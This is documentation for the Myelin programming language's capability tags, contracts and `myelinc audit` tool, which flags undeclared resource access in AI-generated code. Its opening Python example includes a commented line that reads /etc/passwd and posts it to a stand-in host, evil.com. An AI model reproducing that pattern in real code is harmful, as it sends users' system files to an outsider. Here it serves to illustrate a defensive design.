# Capabilities & Security Model

One of Myelin's core design pillars is **Zero Ambient Authority**. In traditional languages like Python, C#, or JavaScript, any function can secretly read your SSH keys, send network packets, or format your disk:

```python
# Unsafe in Python: does calculate_tax steal your files?
def calculate_tax(income):
    # Could secretly do: requests.post("https://evil.com", data=open("/etc/passwd").read())
    return income * 0.18
```

In Myelin, **pure functions are mathematically isolated**. If a function does not declare a capability, the compiler and runtime physically prevent it from touching system resources.

---

## The Capability Tags (`!`)

Capabilities are declared at the end of a function signature using `!` followed by a dotted identifier:

```myelin
#fn send_invoice [email:str amt:i64] !net.http !db.rw !io
  -- Can use HTTP, database, and standard I/O
```

### Standard Capability Hierarchy

| Capability | Scope | Allowed Operations |
| :--- | :--- | :--- |
| `!io` | Standard Console I/O | `io.println`, debugging and log printing |
| `!net` | Network Operations | TCP, UDP, bare-metal HTTP client/server (`http.serve`) |
| `!db` | Persistent Storage | Read/write access to embedded database (`db.set`, `db.get`, `db.has`) |
| `!term` | Terminal Emulation | ANSI styling and terminal formatting (`term.green`, `term.bold`, etc.) |
| `!cli` | Command-Line Environment | Reading flags and positional parameters (`cli.args`, `cli.flag_bool`, etc.) |
| `!fs` | File System | Direct file system reading and writing |
| `!time` / `!clock` | System Clock | Reading wall-clock time and system timers |
| `!unsafe.mem` | Raw Pointer Memory | Direct pointer dereferences, raw buffer mutations |
| `!unsafe.ffi` | Foreign Function ABI | Dynamic calls into foreign C/Rust ABI bindings (`#ext`) |

---

## Design-by-Contract (`req` and `ens`)

Myelin includes first-class contractual specifications:
- `req <Expr>` (pre-condition): Must be true before the function body executes.
- `ens <Expr>` (post-condition): Must be true when the function returns (uses `ret` to refer to return value).

```myelin
#fn deposit [bal:i64 amt:i64 -> i64]
  req amt > 0
  ens ret > bal
  new_bal = bal + amt
  = new_bal
```

If contracts are violated at runtime, an assertion failure is triggered with source locations, immediately exposing faulty logic.

---

## Trust & Capability Audit (`myelinc audit`)

When AI agents generate thousands of lines of software, human engineers do not need to read every single line of code. Instead, they run the cryptographic audit engine:

```bash
myelinc audit examples/cli_tool.myl
```

This outputs a cryptographic **Human Trust Manifest** verified against NIST FIPS 180-4 SHA-256:

```text
================================================================================
                    MYELIN TRUST & CAPABILITY MANIFEST                          
================================================================================
Module:        main
Source:        examples/cli_tool.myl
SHA256:        f2a2fc46a7d5fe62f4640a2b2efa3092733f80d1603105858919bab447d23632
Safety Status: VERIFIED (Mathematically sound, zero ambient authority)

-- CAPABILITY & AUTHORITY AUDIT ------------------------------------------------
* Function '#fn main':
    Declared:  !io !cli !term
    Used:      !io
    Calls:     cli.flag_bool, cli.flag_int, cli.flag_str, io.println, str.fmt, term.bold, term.cyan, term.green, term.red, term.yellow
    Verdict:   [SAFE] Authorized by capability declaration

-- UNTRUSTED OPERATIONS & FOREIGN INTEROP --------------------------------------
  None (Fully sandboxed memory & execution, zero raw pointer dereferences)

-- FORMAL VERIFICATION & CONTRACTS ---------------------------------------------
Pre-conditions  (req): 0 verified
Post-conditions (ens): 0 verified
Flat Guards     (?):   0 runtime assertions & bounds checks

-- EXTRACTED MODULE DECLARATIONS -----------------------------------------------
Records (#rec): 0
Functions (#fn): 1
  - #fn main [] !io !cli !term
Tests (#test): 0
================================================================================
  TRUST VERDICT: 0 VIOLATIONS | ZERO AMBIENT AUTHORITY VERIFIED
================================================================================
```

### Detecting Capability Violations

If an AI agent produces code that attempts to access system resources without declaring the proper capability, `myelinc audit` immediately flags the unauthorized access and rejects the artifact:

```text
-- CAPABILITY & AUTHORITY AUDIT ------------------------------------------------
* Function '#fn leak':
    Declared:  [] (Pure)
    Used:      !db
    Calls:     db.set
    Verdict:   [VIOLATION: Capability '!db' used in function 'leak' but not declared!]
...
================================================================================
  TRUST VERDICT: REJECTED — CAPABILITY LEAK DETECTED
================================================================================
```

### Autonomous Audit in CI/CD (`--llm`)

For continuous integration and autonomous agents, `myelinc audit` outputs a single-line summary when `--llm` is passed:

```bash
myelinc audit src/module.myl --llm
```

Output:
```text
OK AUDIT main | sha256=ce950f81299d59e9d3d061e1df75661c0256d8553fecf62aff244187b16a1d9f | recs=0 sums=0 fns=2 tests=0 exts=0 | contracts=req:0,ens:0,guards:0 | violations=0 | status=VERIFIED
```
If a violation occurs, `status=REJECTED` and `violations=1` are reported with exit code 1, immediately halting untrusted deployment pipelines.
